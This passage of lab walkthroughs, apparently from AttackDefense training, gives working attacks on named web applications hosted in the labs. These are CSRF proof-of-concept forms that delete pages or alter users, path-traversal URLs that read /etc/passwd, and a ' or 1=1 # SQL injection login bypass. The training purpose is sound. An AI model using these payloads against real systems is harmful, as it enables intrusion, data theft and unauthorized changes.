      <input type="hidden" name="ad11_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad11_directionType" value="From Top" /> 
      <input type="hidden" name="ad11_excerptNumber" value="0" /> 
      <input type="hidden" name="ad11_enable_manual" value="0" /> 
      <input type="hidden" name="ad11_enable_php_call" value="0" /> 
      <input type="hidden" name="ad12_name" value="Block 12" /> 
      <input type="hidden" name="ad12_process_php" value="0" /> 
      <input type="hidden" name="ad12_data" value="" /> 
      <input type="hidden" name="ad12_displayType" value="None" /> 
      <input type="hidden" name="ad12_display_for_users" value="all" /> 
      <input type="hidden" name="ad12_display_for_devices" value="all" /> 
      <input type="hidden" name="ad12_floatType" value="None" /> 
      <input type="hidden" name="ad12_custom_css" value="" /> 
      <input type="hidden" name="ad12_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad12_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad12_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad12_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad12_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad12_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad12_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad12_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad12_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad12_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad12_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad12_after_day" value="0" /> 
      <input type="hidden" name="ad12_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad12_block_user" value="" /> 
      <input type="hidden" name="ad12_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad12_block_cat" value="" /> 
      <input type="hidden" name="ad12_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad12_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad12_paragraph_text" value="" /> 
      <input type="hidden" name="ad12_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad12_directionType" value="From Top" /> 
      <input type="hidden" name="ad12_excerptNumber" value="0" /> 
      <input type="hidden" name="ad12_enable_manual" value="0" /> 
      <input type="hidden" name="ad12_enable_php_call" value="0" /> 
      <input type="hidden" name="ad13_name" value="Block 13" /> 
      <input type="hidden" name="ad13_process_php" value="0" /> 
      <input type="hidden" name="ad13_data" value="" /> 
      <input type="hidden" name="ad13_displayType" value="None" /> 
      <input type="hidden" name="ad13_display_for_users" value="all" /> 
      <input type="hidden" name="ad13_display_for_devices" value="all" /> 
      <input type="hidden" name="ad13_floatType" value="None" /> 
      <input type="hidden" name="ad13_custom_css" value="" /> 
      <input type="hidden" name="ad13_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad13_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad13_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad13_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad13_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad13_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad13_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad13_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad13_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad13_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad13_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad13_after_day" value="0" /> 
      <input type="hidden" name="ad13_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad13_block_user" value="" /> 
      <input type="hidden" name="ad13_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad13_block_cat" value="" /> 
      <input type="hidden" name="ad13_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad13_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad13_paragraph_text" value="" /> 
      <input type="hidden" name="ad13_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad13_directionType" value="From Top" /> 
      <input type="hidden" name="ad13_excerptNumber" value="0" /> 
      <input type="hidden" name="ad13_enable_manual" value="0" /> 
      <input type="hidden" name="ad13_enable_php_call" value="0" /> 
      <input type="hidden" name="ad14_name" value="Block 14" /> 
      <input type="hidden" name="ad14_process_php" value="0" /> 
      <input type="hidden" name="ad14_data" value="" /> 
      <input type="hidden" name="ad14_displayType" value="None" /> 
      <input type="hidden" name="ad14_display_for_users" value="all" /> 
      <input type="hidden" name="ad14_display_for_devices" value="all" /> 
      <input type="hidden" name="ad14_floatType" value="None" /> 
      <input type="hidden" name="ad14_custom_css" value="" /> 
      <input type="hidden" name="ad14_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad14_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad14_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad14_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad14_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad14_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad14_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad14_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad14_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad14_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad14_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad14_after_day" value="0" /> 
      <input type="hidden" name="ad14_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad14_block_user" value="" /> 
      <input type="hidden" name="ad14_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad14_block_cat" value="" /> 
      <input type="hidden" name="ad14_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad14_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad14_paragraph_text" value="" /> 
      <input type="hidden" name="ad14_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad14_directionType" value="From Top" /> 
      <input type="hidden" name="ad14_excerptNumber" value="0" /> 
      <input type="hidden" name="ad14_enable_manual" value="0" /> 
      <input type="hidden" name="ad14_enable_php_call" value="0" /> 
      <input type="hidden" name="ad15_name" value="Block 15" /> 
      <input type="hidden" name="ad15_process_php" value="0" /> 
      <input type="hidden" name="ad15_data" value="" /> 
      <input type="hidden" name="ad15_displayType" value="None" /> 
      <input type="hidden" name="ad15_display_for_users" value="all" /> 
      <input type="hidden" name="ad15_display_for_devices" value="all" /> 
      <input type="hidden" name="ad15_floatType" value="None" /> 
      <input type="hidden" name="ad15_custom_css" value="" /> 
      <input type="hidden" name="ad15_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad15_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad15_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad15_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad15_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad15_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad15_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad15_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad15_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad15_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad15_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad15_after_day" value="0" /> 
      <input type="hidden" name="ad15_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad15_block_user" value="" /> 
      <input type="hidden" name="ad15_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad15_block_cat" value="" /> 
      <input type="hidden" name="ad15_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad15_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad15_paragraph_text" value="" /> 
      <input type="hidden" name="ad15_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad15_directionType" value="From Top" /> 
      <input type="hidden" name="ad15_excerptNumber" value="0" /> 
      <input type="hidden" name="ad15_enable_manual" value="0" /> 
      <input type="hidden" name="ad15_enable_php_call" value="0" /> 
      <input type="hidden" name="ad16_name" value="Block 16" /> 
      <input type="hidden" name="ad16_process_php" value="0" /> 
      <input type="hidden" name="ad16_data" value="" /> 
      <input type="hidden" name="ad16_displayType" value="None" /> 
      <input type="hidden" name="ad16_display_for_users" value="all" /> 
      <input type="hidden" name="ad16_display_for_devices" value="all" /> 
      <input type="hidden" name="ad16_floatType" value="None" /> 
      <input type="hidden" name="ad16_custom_css" value="" /> 
      <input type="hidden" name="ad16_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad16_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad16_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad16_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad16_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad16_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad16_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad16_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad16_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad16_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad16_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad16_after_day" value="0" /> 
      <input type="hidden" name="ad16_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad16_block_user" value="" /> 
      <input type="hidden" name="ad16_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad16_block_cat" value="" /> 
      <input type="hidden" name="ad16_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad16_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad16_paragraph_text" value="" /> 
      <input type="hidden" name="ad16_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad16_directionType" value="From Top" /> 
      <input type="hidden" name="ad16_excerptNumber" value="0" /> 
      <input type="hidden" name="ad16_enable_manual" value="0" /> 
      <input type="hidden" name="ad16_enable_php_call" value="0" /> 
      <input type="hidden" name="adH_process_php" value="0" /> 
      <input type="hidden" name="adH_data" value="" /> 
      <input type="hidden" name="adH_enable" value="0" /> 
      <input type="hidden" name="adF_process_php" value="0" /> 
      <input type="hidden" name="adF_data" value="" /> 
      <input type="hidden" name="adF_enable" value="0" /> 
      <input type="hidden" name="syntax-highlighter-theme" value="ad_inserter" /> 
      <input type="hidden" name="block-class-name" value="code-block" /> 
      <input type="hidden" name="ai-active-tab" value="1" /> 
      <input type="submit" value="Submit request" /> 
    </form> 
  </body> 
</html> 
 
 
Save the HTML script as csrf.html 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
Step 6: ​Click on Submit request. 
 
 
 
 
 
 
 
 
The CSRF was successful and as a result XSS was triggered.  
 
 
References:  
 
1.
Wordpress (​http://wordpress.org/​) 
2.
Ad Inserter (​https://wordpress.org/plugins/ad-inserter/​)  
3.
WordPress Plugin Ad Inserter 1.5.2 - Cross-Site Request Forgery 
 (​https://www.exploit-db.com/exploits/36961​)  
 
 
 
Name 
Cube Cart 
URL 
https://www.attackdefense.com/challengedetails?cid=488  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “cube cart exploit” and look for publicly available exploits. 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/39637 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and log into the 
web application. 
 
URL: ​http://xu67jhd4n906c56798f19z0ic.us-eastx.attackdefenselabs.com/admin.php 
 
 
 
Credentials: 
 
●
Username: ​admin 
●
Password​: password 
 
Admin Dashboard: 
 
 
 
Step 4: ​Navigate to index of the website located at /index.php. 
 
 
 
Step 5: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
<form 
action="http://xu67jhd4n906c56798f19z0ic.us-eastx.attackdefenselabs.com/admin.php?_g=maintenance
&node=index&delete=../index.php" method="POST" name="f1"> 
</form> 
<script>document.f1.submit();</script> 
 
 
Save the HTML script as csrf.html 
 
 
 
 
 
 
 
Step 6: ​Open the HTML script in the same browser session. 
 
 
 
Step 7: ​Reload the index.php page 
 
 
 
 
 
 
 
 
The CSRF was successful and as a result the index page was deleted.  
 
 
 
References:  
 
1.
CubeCart (​https://www.cubecart.com/​)  
2.
CubeCart 6.0.10 - Multiple Vulnerabilities(​https://www.exploit-db.com/exploits/39637​) 
 
 
 
Name 
BirdBlog 
URL 
https://www.attackdefense.com/challengedetails?cid=489  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
Step 2: ​Search on google “birdblog  vulnerability exploit db” and look for publicly available 
exploits. 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/40495 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and login to the 
web application 
 
URL: 
http://ezge37gfm3z7ho1ykjwni9rvj.mumbaix.attackdefenselabs.com/admin/user.php?a=loginfor
m 
 
 
 
Credentials: 
 
●
Username: ​admin 
●
Password​: password 
 
Admin Dashboard: 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Navigate to “Manage Entries”. 
 
 
 
Currently there are no entries. 
 
Step 5: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
 
HTML Script: 
 
 
<html> 
  <!-- CSRF PoC --> 
  <body> 
    <form 
action="http://ezge37gfm3z7ho1ykjwni9rvj.mumbaix.attackdefenselabs.com/admin/entries.php?a=post" 
method="POST"> 
      <input type="hidden" name="title" value="Exploit&#45;DB" /> 
      <input type="hidden" name="category" value="1" /> 
      <input type="hidden" name="music" value="rockrock" /> 
      <input type="hidden" name="mood" value="rock" /> 
      <input type="hidden" name="moodicon" value="1" /> 
      <input type="hidden" name="entry" value="tester" /> 
      <input type="hidden" name="excerpt" value="tester" /> 
      <input type="hidden" name="password" value="" /> 
      <input type="hidden" name="parseurls" value="1" /> 
      <input type="hidden" name="parseemoticons" value="1" /> 
      <input type="hidden" name="parsebbcode" value="1" /> 
      <input type="submit" value="Submit request" /> 
    </form> 
    <script> 
      document.forms[0].submit(); 
    </script> 
  </body> 
</html> 
 
Save the HTML script as csrf.html 
 
 
 
 
Step 6: ​Open the HTML script in the same browser session. 
 
 
 
Step 7: ​Navigate to the “Manage Entries” to see the effect. 
 
 
 
The CSRF was successful and as a result, an entry was added.  
 
 
 
 
 
References:  
 
1.
Bird Blog  (​http://www.hotscripts.com/listings/jump/download/49011​)  
2.
BirdBlog 1.4.0 - Cross-Site Request Forgery (Add New Post) 
(​https://www.exploit-db.com/exploits/40495​)  
 
 
 
Name 
Gnew 
URL 
https://www.attackdefense.com/challengedetails?cid=490  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “gnew 2018.1 exploit” and look for publicly available exploits. 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/43909 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and log into the 
web application 
 
URL: 
http://8k4o3584zwe5z0vqf6iz1aqu3.us-eastx.attackdefenselabs.com/gnew/users/login.php 
 
 
 
 
 
Credentials: 
 
●
Username: ​admin 
●
Password​: password 
 
Admin Dashboard: 
 
 
 
Step 4: ​Navigate to “users” section located at /gnew/admin/users.php. 
 
 
 
 
 
 
Step 5: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
<form 
action="http://8k4o3584zwe5z0vqf6iz1aqu3.us-eastx.attackdefenselabs.com/gnew/admin/users.php " 
method="POST"> 
 <input type="hidden" name="_method" value="POST"/> 
 <input type="hidden" name="user_name" value="test2"/> 
 <input type="hidden" name="user_level" value="4"/> 
 <input type="hidden" name="user_email" value="gnewtest@yopmail.com"/> 
 <input type="hidden" name="user_show_email" value="0"/> 
<input type="hidden" name="user_day" value="0"/> 
<input type="hidden" name="user_month" value="0"/> 
<input type="hidden" name="user_month" value="0"/> 
 <input type="hidden" name="user_language" value="english"/> 
 <input type="hidden" name="user_template" value="clean"/> 
 <input type="hidden" name="user_date_format" value="D,+M+jS+Y,+g:i+a"/> 
 <input type="hidden" name="user_date_offset" value="0"/> 
<input type="hidden" name="user_avatar" value=""/> 
 <input type="hidden" name="user_date_offset" value="0"/> 
 <input type="hidden" name="user_avatar" 
value="./../images/avatars/empty.png"/> 
 <input type="hidden" name="user_id" value="2"/> 
<input type="hidden" name="user_level_old" value="1"/> 
<input type="hidden" name="user_name_old" value="test2"/> 
<input type="hidden" name="edit_user" value="Ã‰diter"/> 
<input type="submit" value="CSRF This"/></form> 
 
Save the HTML script as csrf.html 
 
 
 
Step 6: ​Open the HTML script in the same browser session. 
 
 
 
Step 7: ​Click on “Submit request” and check the user “test2” page. 
 
 
 
 
 
 
 
 
 
 
 
 
 
The CSRF was successful and as a result the user details were changed.  
 
 
References:  
 
1.
Gnew (​http://www.gnew.xyz/pages/download.php​)  
2.
Gnew 2018.1 - Cross-Site Request Forgery (​https://www.exploit-db.com/exploits/43909​) 
 
 
 
Name 
SIMOGEO FileManager 
URL 
https://www.attackdefense.com/challengedetails?cid=311 
Type 
Real World Webapps : Arbitrary File Download 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “simogeo filemanager vulnerability” and look for publicly available 
exploits. 
 
 
 
 
 
 
 
 
 
 
 
The exploit db link contains the steps to be followed to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/38895 
 
 
 
Step 3: ​Navigate to the vulnerable URL to exploit the vulnerability.  
 
URL: 
http://zao94xnigg8t3nzonzi8xi11x.mumbaix.attackdefenselabs.com/connectors/php/filemanager.
php?mode=preview&path=//....//....//....//....//....//....//....//....//....//etc/passwd 
 
 
 
Step 4: ​Open the Downloaded file. 
 
 
 
The passwd file of the webserver was downloaded.  
 
References:  
 
1.
SIMOGEO FileManager (​https://github.com/simogeo/Filemanager​)  
2.
SIMOGEO FileManager 2.3.0 - Multiple Vulnerabilities 
(​https://www.exploit-db.com/exploits/38895​)  
 
 
 
Name 
Codiad 
URL 
https://www.attackdefense.com/challengedetails?cid=312 
Type 
Real World Webapps : Arbitrary File Download 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “codiad vulnerability exploit db” and look for publicly available 
exploits. 
 
 
 
The exploit db link contains the steps to be followed to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/36371  
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
Credentials: 
 
●
Username​:​ ​admin 
●
Password​: password 
 
Admin Dashboard: 
 
 
 
Step 4: ​Navigate to the vulnerable URL to exploit the vulnerability.  
 
URL: 
http://h8wxywsomldiekh3fxkhj54is.mumbaix.attackdefenselabs.com/components/filemanager/do
wnload.php?path=../../../../../../../../../../../etc/passwd&type=undefined 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 5: ​Open the Downloaded file. 
 
 
 
The passwd file of the webserver was downloaded.  
 
 
 
References:  
 
1.
Codiad  (​http://codiad.com/​)  
2.
Codiad 2.5.3 - Local File Inclusion (​https://www.exploit-db.com/exploits/36371​)  
 
 
 
Name 
Tiki Wiki CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=313 
Type 
Real World Webapps : Arbitrary File Download 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Tiki Wiki CMS  vulnerability” and look for publicly available exploits. 
 
 
 
 
The exploit db link contains the steps to be followed to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40080 
 
 
 
Step 3: ​Navigate to the vulnerable URL to exploit the vulnerability.  
 
URL: 
http://b14n7uw3zas8prjl5vokwekir.mumbaix.attackdefenselabs.com/tiki/vendor/player/flv/flv_stre
am.php?file=../../../../../../../etc/passwd&position=0 
 
 
 
Step 4: ​Open the Downloaded file. 
 
 
 
The passwd file of the webserver was downloaded.  
 
References:  
 
1.
Tiki Wiki (​https://tiki.org​)  
2.
Tiki Wiki CMS 15.0 - Arbitrary File Download(​https://www.exploit-db.com/exploits/40080​)  
 
 
 
Name 
WordPress History Collection 
URL 
https://www.attackdefense.com/challengedetails?cid=470 
Type 
Real World Webapps : Arbitrary File Download 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “WordPress History Collection Plugin vulnerability” and look for 
publicly available exploits. 
 
 
 
 
 
The exploit db link contains the steps to be followed to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/37254 
 
 
 
Step 3: ​Navigate to the vulnerable URL to exploit the vulnerability.  
 
 
URL: 
http://sggl5p5b6j93e4ynhdheufmmd.mumbaix.attackdefenselabs.com/wp-content/plugins/histor
y-collection/download.php?var=/etc/passwd 
 
 
 
Step 4: ​Open the Downloaded file. 
 
 
 
The passwd file of the webserver has been downloaded.  
 
References:  
 
1.
WordPress Plugin History Collection  (​https://wordpress.org/plugins/history-collection/​)  
2.
WordPress Plugin History Collection 1.1.1 - Arbitrary File Download 
(​https://www.exploit-db.com/exploits/37254​)  
 
 
 
Name 
Finder View 
URL 
https://www.attackdefense.com/challengedetails?cid=447 
Type 
Real World Webapps : Directory Traversal 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “finderview vulnerability” and look for publicly available exploits. 
 
 
 
 
 
 
 
 
 
 
The exploit db link contains the steps to be followed to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40011 
 
 
 
Step 3: ​Navigate to the vulnerable URL to exploit the vulnerability.  
 
URL: 
http://1ct8w1vhde21jwcgck8oxuzuu.mumbaix.attackdefenselabs.com/api.php/?callback=jQuery
21107685743998649676_1466662516225&type=get&mode=0&folder=Li4vLi4vLi4vLi4vLi4vLi4v
ZXRjLw==&_=1466662516227 
 
 
 
The directory was traversed successfully and the relative path of various folder and directory 
was listed. 
 
 
References:  
 
1.
FinderView (​https://github.com/proin/​)  
2.
FinderView - Multiple Vulnerabilities (​https://www.exploit-db.com/exploits/40011​)  
 
 
 
Name 
JB File Manager 
URL 
https://www.attackdefense.com/challengedetails?cid=502 
Type 
Real World Webapps : Directory Traversal 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “jbfilemanager exploit” and look for publicly available exploits. 
 
 
 
 
 
 
The exploit db link contains the steps to be followed to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39956 
 
 
 
Step 3: ​Navigate to the vulnerable URL to exploit the vulnerability.  
 
URL: 
http://58l8983kf3tf9g7x1bqcpas1h.mumbaix.attackdefenselabs.com/jbfm.php?act=open&path=/.
./../../../../../../../../etc/ 
 
 
 
The directory was traversed successfully and the relative path of various folder and directory 
was listed. 
 
References:  
 
1.
jbFileManager (​https://github.com/ismiranda/jbFileManager​)  
2.
jbFileManager - Directory Traversal (​https://www.exploit-db.com/exploits/39956​)  
 
 
 
Name 
Free Article Submissions 1.0 
URL 
https://www.attackdefense.com/challengedetails?cid=315  
Type 
Real World Webapps : Broken Authentication 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
Step 2: ​Search on google “Free Article Submissions 1.0 exploit”. 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter and the SQLI 
payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/35492  
 
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Navigate to the Admin panel, the admin panel is located at “/admin” panel. 
 
URL: ​http://shqcopsqovqbz033xt2091ztm.hidenseek-1.attackdefenselabs.com/install 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Inject the SQLI payload in the username field and enter any value in the password field 
to bypass the authentication.  
 
Payload:  ​' or 1=1 # 
 
Username: ​' or 1=1 # 
Password: ​password 
 
 
 
Admin Dashboard: 
 
 
 
The authentication was bypassed successfully.  
 
References:  
 
1.
Free Article Submissions (​http://www.articlesetup.com/​)  
2.
Free Article Submissions 1.0 - SQL Injection (​https://www.exploit-db.com/exploits/35492​)  
 
 
 
Name 
Boonex Dolphin 
URL 
https://attackdefense.com/challengedetails?cid=436 
Type 
Real World Webapps : Broken Authentication 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “boonex dolphin exploit” and look for publicly available exploits. 
 
 
 
The exploit db link contains the information regarding the cookie which can be used to exploit 
the vulnerability. 
 
